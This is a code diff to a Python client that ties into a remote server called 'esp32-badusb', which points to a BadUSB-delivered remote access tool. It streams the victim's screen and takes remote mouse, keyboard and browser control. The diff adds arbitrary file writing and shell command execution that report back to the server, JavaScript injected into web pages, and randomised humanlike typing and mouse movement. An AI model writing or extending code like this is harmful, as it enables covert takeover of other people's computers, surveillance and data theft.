@@ -17,7 +17,7 @@ def install_deps():
     pkgs = ["pillow", "python-socketio[client]", "requests", "websocket-client",
             "pyautogui", "pynput", "pyperclip", "cryptography", "uiautomation", "comtypes"]
     try:
-        from PIL import ImageGrab
+        from PIL import ImageGrab, ImageDraw
         import pyautogui, requests, socketio, pynput, pyperclip
         from cryptography.fernet import Fernet
         import uiautomation
@@ -27,7 +27,7 @@ def install_deps():
 
 install_deps()
 
-from PIL import ImageGrab
+from PIL import ImageGrab, ImageDraw
 import pyautogui
 import requests
 import socketio
@@ -59,7 +59,8 @@ pyautogui.FAILSAFE = False
 # ============================================================
 SERVER_URL = "https://esp32-badusb.onrender.com"
 HEARTBEAT_INTERVAL  = 5.0
-SCREENSHOT_INTERVAL = 3.0
+screenshot_interval = 3.0
+last_click_time = 0.0
 CDP_PORT     = 9222
 PINCHTAB_PORT = 4000
 PINCHTAB_ACTIVE = False
@@ -1080,6 +1081,19 @@ def run_hardware_mission(mission_name):
     else:
         print_log(f"Unknown mission: {mission_name}")
 
+@sio.on("set_screenshot_rate")
+def on_set_screenshot_rate(data):
+    global screenshot_interval
+    try:
+        if isinstance(data, dict):
+            rate = float(data.get("rate", 3.0))
+        else:
+            rate = float(data)
+        screenshot_interval = max(0.1, min(10.0, rate))
+        print_log(f"Dynamic screenshot interval updated to {screenshot_interval}s")
+    except Exception as e:
+        print_log(f"Failed to set screenshot rate: {e}")
+
 @sio.event
 def execute_json_command(data):
     print_log(f"JSON Command: {data}")
@@ -1103,19 +1117,66 @@ def execute_json_command(data):
             
             if pt_action == "click":
                 selector = data.get("selector", "")
-                # Try PinchTab first, then CDP
+                
+                # Injected JS: Creates a custom virtual purple glowing cursor DOM element
+                # and glides it smoothly to the target coordinate before dispatching physical clicks!
+                js_click = f"""(function(){{
+                    var cursor = document.getElementById('ghost-browser-cursor');
+                    if (!cursor) {{
+                        cursor = document.createElement('div');
+                        cursor.id = 'ghost-browser-cursor';
+                        cursor.style.position = 'fixed';
+                        cursor.style.width = '24px';
+                        cursor.style.height = '24px';
+                        cursor.style.zIndex = '9999999';
+                        cursor.style.pointerEvents = 'none';
+                        cursor.style.left = '0px';
+                        cursor.style.top = '0px';
+                        cursor.style.transition = 'left 0.5s cubic-bezier(0.25, 0.8, 0.25, 1), top 0.5s cubic-bezier(0.25, 0.8, 0.25, 1)';
+                        cursor.innerHTML = `
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <circle cx="5" cy="5" r="8" fill="#8B5CF6" opacity="0.4" style="filter: blur(2px);"/>
+                                <path d="M4.5 3V18.5L8.5 14.5H14.5L4.5 3Z" fill="#8B5CF6" stroke="white" stroke-width="1.5"/>
+                                <circle id="ghost-pulse" cx="5" cy="5" r="0" stroke="#EF4444" stroke-width="2" fill="none" style="transition: r 0.2s ease-out, opacity 0.2s; opacity: 0;"/>
+                            </svg>
+                        `;
+                        document.body.appendChild(cursor);
+                        var s = document.createElement('style');
+                        s.innerHTML = '#ghost-browser-cursor.clicking #ghost-pulse {{ r: 10px !important; opacity: 1 !important; }}';
+                        document.head.appendChild(s);
+                    }}
+                    var el = document.querySelector('{selector}');
+                    if (!el) return 'not_found';
+                    el.scrollIntoView({{block: 'center', behavior: 'smooth'}});
+                    setTimeout(function() {{
+                        var r = el.getBoundingClientRect();
+                        var cx = r.left + r.width/2;
+                        var cy = r.top + r.height/2;
+                        cursor.style.left = cx + 'px';
+                        cursor.style.top = cy + 'px';
+                        setTimeout(function() {{
+                            cursor.classList.add('clicking');
+                            setTimeout(function() {{
+                                cursor.classList.remove('clicking');
+                                el.click();
+                                el.dispatchEvent(new MouseEvent('click', {{bubbles:true}}));
+                            }}, 200);
+                        }}, 500);
+                    }}, 300);
+                    return 'animating';
+                }})()"""
+                
                 if PINCHTAB_ACTIVE:
                     try:
-                        js_click = f"(function(){{ var el = document.querySelector('{selector}'); if(el){{ el.scrollIntoView({{block:'center'}}); el.click(); return 'clicked'; }} return 'not found'; }})()"
                         requests.post(f"http://127.0.0.1:{PINCHTAB_PORT}/v1/browser/evaluate",
                                       json={"expression": js_click}, timeout=5)
-                        print_log(f"PinchTab click: {selector}")
+                        print_log(f"PinchTab Visual Click: {selector}")
                     except Exception as e:
-                        print_log(f"PinchTab click failed: {e}")
+                        print_log(f"PinchTab Visual Click failed: {e}")
                         if ws_cdp:
-                            send_cdp_command("Runtime.evaluate", {"expression": f"document.querySelector('{selector}').click();"})
+                            send_cdp_command("Runtime.evaluate", {"expression": js_click})
                 elif ws_cdp:
-                    send_cdp_command("Runtime.evaluate", {"expression": f"document.querySelector('{selector}').click();"})
+                    send_cdp_command("Runtime.evaluate", {"expression": js_click})
                 else:
                     print_log(f"Cannot click selector: no browser control available")
                 return
@@ -1123,20 +1184,79 @@ def execute_json_command(data):
             if pt_action == "type":
                 selector = data.get("selector", "")
                 text = data.get("text", "")
+                escaped_text = text.replace('"', '\\"').replace('\n', '\\n')
+                
+                # Injected JS: Glides the custom cursor to focus the textbox,
+                # and types character-by-character with randomized delays!
+                js_type = f"""(function(){{
+                    var cursor = document.getElementById('ghost-browser-cursor');
+                    if (!cursor) {{
+                        cursor = document.createElement('div');
+                        cursor.id = 'ghost-browser-cursor';
+                        cursor.style.position = 'fixed';
+                        cursor.style.width = '24px';
+                        cursor.style.height = '24px';
+                        cursor.style.zIndex = '9999999';
+                        cursor.style.pointerEvents = 'none';
+                        cursor.style.left = '0px';
+                        cursor.style.top = '0px';
+                        cursor.style.transition = 'left 0.5s cubic-bezier(0.25, 0.8, 0.25, 1), top 0.5s cubic-bezier(0.25, 0.8, 0.25, 1)';
+                        cursor.innerHTML = `
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <circle cx="5" cy="5" r="8" fill="#8B5CF6" opacity="0.4" style="filter: blur(2px);"/>
+                                <path d="M4.5 3V18.5L8.5 14.5H14.5L4.5 3Z" fill="#8B5CF6" stroke="white" stroke-width="1.5"/>
+                                <circle id="ghost-pulse" cx="5" cy="5" r="0" stroke="#EF4444" stroke-width="2" fill="none" style="transition: r 0.2s ease-out, opacity 0.2s; opacity: 0;"/>
+                            </svg>
+                        `;
+                        document.body.appendChild(cursor);
+                        var s = document.createElement('style');
+                        s.innerHTML = '#ghost-browser-cursor.clicking #ghost-pulse {{ r: 10px !important; opacity: 1 !important; }}';
+                        document.head.appendChild(s);
+                    }}
+                    var el = document.querySelector('{selector}');
+                    if (!el) return 'not_found';
+                    el.scrollIntoView({{block: 'center', behavior: 'smooth'}});
+                    setTimeout(function() {{
+                        var r = el.getBoundingClientRect();
+                        var cx = r.left + r.width/2;
+                        var cy = r.top + r.height/2;
+                        cursor.style.left = cx + 'px';
+                        cursor.style.top = cy + 'px';
+                        setTimeout(function() {{
+                            cursor.classList.add('clicking');
+                            setTimeout(function() {{
+                                cursor.classList.remove('clicking');
+                                el.focus();
+                                el.value = '';
+                                var txt = "{escaped_text}";
+                                var idx = 0;
+                                function type() {{
+                                    if (idx < txt.length) {{
+                                        el.value += txt[idx++];
+                                        el.dispatchEvent(new Event('input', {{bubbles:true}}));
+                                        setTimeout(type, Math.random() * 80 + 40);
+                                    }} else {{
+                                        el.dispatchEvent(new Event('change', {{bubbles:true}}));
+                                    }}
+                                }}
+                                type();
+                            }}, 200);
+                        }}, 500);
+                    }}, 300);
+                    return 'animating';
+                }})()"""
+                
                 if PINCHTAB_ACTIVE:
                     try:
-                        js_type = f"""(function(){{ var el = document.querySelector('{selector}'); if(el){{ el.scrollIntoView({{block:'center'}}); el.focus(); el.value = '{text}'; el.dispatchEvent(new Event('input', {{bubbles:true}})); el.dispatchEvent(new Event('change', {{bubbles:true}})); return 'typed'; }} return 'not found'; }})()"""
                         requests.post(f"http://127.0.0.1:{PINCHTAB_PORT}/v1/browser/evaluate",
                                       json={"expression": js_type}, timeout=5)
-                        print_log(f"PinchTab type: {selector} = {text}")
+                        print_log(f"PinchTab Visual Type: {selector} = {text}")
                     except Exception as e:
-                        print_log(f"PinchTab type failed: {e}")
+                        print_log(f"PinchTab Visual Type failed: {e}")
                         if ws_cdp:
-                            js = f"var el=document.querySelector('{selector}'); el.value='{text}'; el.dispatchEvent(new Event('input',{{bubbles:true}}));"
-                            send_cdp_command("Runtime.evaluate", {"expression": js})
+                            send_cdp_command("Runtime.evaluate", {"expression": js_type})
                 elif ws_cdp:
-                    js = f"var el=document.querySelector('{selector}'); el.value='{text}'; el.dispatchEvent(new Event('input',{{bubbles:true}}));"
-                    send_cdp_command("Runtime.evaluate", {"expression": js})
+                    send_cdp_command("Runtime.evaluate", {"expression": js_type})
                 else:
                     print_log(f"Cannot type in selector: no browser control available")
                 return
@@ -1200,6 +1320,8 @@ def execute_json_command(data):
                         el = fg.Control(Name=target_name, searchDepth=5)
                     
                     if el and el.Exists(maxSearchSeconds=2):
+                        global last_click_time
+                        last_click_time = time.time()
                         el.Click(simulateMove=True)
                         print_log(f"UIA Click: {target_name or target_id}")
                     else:
@@ -1211,6 +1333,10 @@ def execute_json_command(data):
         if action == "uia_type":
             if not UIA_AVAILABLE:
                 print_log("UIA not available. Falling back to pyautogui.")
+                import random
+                for char in str(data.get("text", "")):
+                    pyautogui.write(char)
+                    time.sleep(random.uniform(0.04, 0.12))
             else:
                 try:
                     target_name = data.get("name", "")
@@ -1224,26 +1350,29 @@ def execute_json_command(data):
                     elif target_name:
                         el = fg.EditControl(Name=target_name, searchDepth=5)
                     else:
-                        # Fallback: cari mana-mana EditControl dalam window
                         el = fg.EditControl(searchDepth=5)
                     
                     if el and el.Exists(maxSearchSeconds=2):
                         el.SetFocus()
-                        try:
-                            # Cuba ValuePattern dulu (paling tepat)
-                            vp = el.GetValuePattern()
-                            vp.SetValue(text)
-                        except Exception:
-                            # Fallback: guna SendKeys
-                            el.SendKeys(text, interval=0.03)
-                        print_log(f"UIA Type: '{text}' → {target_name or target_id or 'auto-detected edit'}")
+                        time.sleep(0.15)
+                        import random
+                        # Type character by character with realistic finger delays
+                        for char in str(text):
+                            el.SendKeys(char, waitTime=0)
+                            time.sleep(random.uniform(0.04, 0.12))
+                        print_log(f"UIA Human Type: '{text}' → {target_name or target_id or 'auto-detected edit'}")
                     else:
                         print_log(f"UIA Type: Edit control not found — {target_name or target_id}")
-                        # Fallback ke pyautogui
-                        pyautogui.typewrite(str(text), interval=0.04)
+                        import random
+                        for char in str(text):
+                            pyautogui.write(char)
+                            time.sleep(random.uniform(0.04, 0.12))
                 except Exception as e:
                     print_log(f"UIA Type failed: {e}, falling back to pyautogui")
-                    pyautogui.typewrite(str(data.get('text', '')), interval=0.04)
+                    import random
+                    for char in str(data.get('text', '')):
+                        pyautogui.write(char)
+                        time.sleep(random.uniform(0.04, 0.12))
             return
         
         if action == "uia_get_tree":
@@ -1264,28 +1393,111 @@ def execute_json_command(data):
         x = int(float(x_raw) * scale_x) if x_raw is not None else None
         y = int(float(y_raw) * scale_y) if y_raw is not None else None
 
+        # Smooth human-like mouse movement
+        def human_move_to(target_x, target_y):
+            try:
+                import random
+                # Smooth duration between 0.35 and 0.65 seconds
+                duration = random.uniform(0.35, 0.65)
+                pyautogui.moveTo(target_x, target_y, duration=duration)
+                # Brief pause before click to simulate target selection settling
+                time.sleep(random.uniform(0.08, 0.18))
+            except Exception:
+                pyautogui.moveTo(target_x, target_y)
+
         if action == "click" and x is not None and y is not None:
-            pyautogui.click(x=x, y=y)
+            human_move_to(x, y)
+            global last_click_time
+            last_click_time = time.time()
+            pyautogui.click()
         elif action == "right_click" and x is not None and y is not None:
-            pyautogui.rightClick(x=x, y=y)
+            human_move_to(x, y)
+            global last_click_time
+            last_click_time = time.time()
+            pyautogui.rightClick()
         elif action == "double_click" and x is not None and y is not None:
-            pyautogui.doubleClick(x=x, y=y)
+            human_move_to(x, y)
+            global last_click_time
+            last_click_time = time.time()
+            pyautogui.doubleClick()
         elif action == "move" and x is not None and y is not None:
-            pyautogui.moveTo(x, y)
+            human_move_to(x, y)
         elif action == "scroll":
             sx = int(float(data.get("x", 960)) * scale_x)
             sy = int(float(data.get("y", 540)) * scale_y)
             direction = data.get("direction", "down")
             amount = int(data.get("amount", 3))
-            pyautogui.scroll(-amount if direction == "down" else amount, x=sx, y=sy)
+            human_move_to(sx, sy)
+            pyautogui.scroll(-amount if direction == "down" else amount)
         elif action == "type" and text:
-            pyautogui.typewrite(str(text), interval=0.04)
+            # Simulate realistic human typing delay key by key!
+            import random
+            for char in str(text):
+                pyautogui.write(char)
+                time.sleep(random.uniform(0.04, 0.12))
         elif action == "press" and key:
             pyautogui.press(key)
         elif action == "hotkey":
             keys = data.get("keys", [])
             if keys:
                 pyautogui.hotkey(*keys)
+        elif action == "write_file":
+            filepath = data.get("filepath")
+            content = data.get("content", "")
+            if filepath:
+                try:
+                    os.makedirs(os.path.dirname(filepath), exist_ok=True)
+                    with open(filepath, "w", encoding="utf-8") as f:
+                        f.write(content)
+                    print_log(f"File written to: {filepath}")
+                    if sio.connected:
+                        sio.emit("command_feedback", {
+                            "status": "success",
+                            "msg": f"File successfully written to {filepath}",
+                            "exit_code": 0
+                        })
+                except Exception as e:
+                    print_log(f"Failed to write file {filepath}: {e}")
+                    if sio.connected:
+                        sio.emit("command_feedback", {
+                            "status": "error",
+                            "msg": f"Failed to write file: {str(e)}"
+                        })
+            return
+            
+        elif action == "execute_script":
+            command = data.get("command")
+            if command:
+                try:
+                    print_log(f"Executing script: {command}")
+                    # Run with timeout to prevent blocking the agent
+                    result = subprocess.run(
+                        command, shell=True, capture_output=True, text=True, timeout=30
+                    )
+                    feedback = {
+                        "status": "success",
+                        "stdout": result.stdout,
+                        "stderr": result.stderr,
+                        "exit_code": result.returncode
+                    }
+                    print_log(f"Execution complete. Exit code: {result.returncode}")
+                except subprocess.TimeoutExpired:
+                    feedback = {
+                        "status": "error",
+                        "msg": "Command execution timed out after 30 seconds."
+                    }
+                    print_log("Execution timed out.")
+                except Exception as e:
+                    feedback = {
+                        "status": "error",
+                        "msg": f"Execution failed: {str(e)}"
+                    }
+                    print_log(f"Execution failed: {e}")
+                
+                if sio.connected:
+                    sio.emit("command_feedback", feedback)
+            return
+
         elif action == "run":
             cmd = data.get("command")
             if cmd:
@@ -1345,7 +1557,7 @@ def build_system_context():
         return {}
 
 def send_screenshots():
-    global running
+    global running, screenshot_interval
     while running:
         try:
             if not sio.connected:
@@ -1358,8 +1570,37 @@ def send_screenshots():
             if sio.connected:
                 try:
                     screenshot = ImageGrab.grab()
-                    buffer = io.BytesIO()
                     screenshot = screenshot.resize((1280, 720))
+                    
+                    # RENDER THE VIRTUAL MOUSE CURSOR DIRECTLY ON THE SCREENSHOT!
+                    try:
+                        cursor_x, cursor_y = pyautogui.position()
+                        screen_w, screen_h = pyautogui.size()
+                        cx = int(cursor_x * (1280 / screen_w))
+                        cy = int(cursor_y * (720 / screen_h))
+                        
+                        draw = ImageDraw.Draw(screenshot)
+                        
+                        # Glowing Target ring around pointer (premium violet)
+                        draw.ellipse([cx-8, cy-8, cx+8, cy+8], outline=(139, 92, 246), width=2)
+                        
+                        # Extra wave if clicked recently
+                        if time.time() - last_click_time < 0.5:
+                            # Glowing red click expansion circle
+                            draw.ellipse([cx-16, cy-16, cx+16, cy+16], outline=(239, 68, 68), width=3)
+                            
+                        # Human classic white pointer arrow
+                        draw.polygon([
+                            (cx, cy),
+                            (cx, cy + 17),
+                            (cx + 4, cy + 13),
+                            (cx + 10, cy + 13),
+                            (cx, cy)
+                        ], fill=(255, 255, 255), outline=(0, 0, 0))
+                    except Exception as ce:
+                        pass
+                        
+                    buffer = io.BytesIO()
                     screenshot.save(buffer, format="JPEG", quality=60)
                     img_str = base64.b64encode(buffer.getvalue()).decode("utf-8")
                     sio.emit("screenshot_data", {
@@ -1391,7 +1632,12 @@ def send_screenshots():
                         print_log(f"HTTP fallback error: {e}")
         except Exception as e:
             print_log(f"Screenshot loop error: {e}")
-        time.sleep(SCREENSHOT_INTERVAL)
+        
+        # Dynamically throttled dynamic sleep
+        if sio.connected:
+            time.sleep(screenshot_interval)
+        else:
+            time.sleep(3.0)
 
 def check_heartbeat_usb():
     try:
